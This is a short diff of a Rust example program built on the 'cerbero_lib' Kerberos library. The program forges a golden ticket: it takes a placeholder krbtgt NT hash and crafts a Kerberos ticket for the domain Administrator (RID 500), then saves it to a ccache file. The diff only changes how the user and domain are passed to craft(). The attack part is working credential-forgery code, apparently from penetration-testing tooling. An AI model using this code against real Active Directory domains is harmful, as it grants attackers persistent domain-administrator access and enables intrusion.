@@ -1,8 +1,7 @@
-use cerbero_lib::{craft, CredFormat, EncryptionType, FileVault, Key, KrbUser, Vault, PISID};
+use cerbero_lib::{craft, CredFormat, EncryptionType, FileVault, Key, Vault, PISID};
 
 fn main()
 {
-	let user = KrbUser::new("Administrator".to_string(), "DOMAIN.COM".to_string());
 	let vault = FileVault::new("tickets.ccache".to_string());
 
 	let rid = 500;
@@ -11,7 +10,18 @@ fn main()
 
 	let krbtgt = Key::from_rc4_key_string("KRBTGT NT HASH").expect("Failed to convert krbtgt key");
 
-	match craft(user, None, krbtgt, rid, sid, &group_rids, Some(EncryptionType::RC4), CredFormat::Ccache, &vault)
+	match craft(
+	            "DOMAIN.COM",
+	            "Administrator",
+	            None,
+	            krbtgt,
+	            rid,
+	            sid,
+	            &group_rids,
+	            Some(EncryptionType::RC4),
+	            CredFormat::Ccache,
+	            &vault,
+	)
 	{
 		Ok(_) =>
 		{
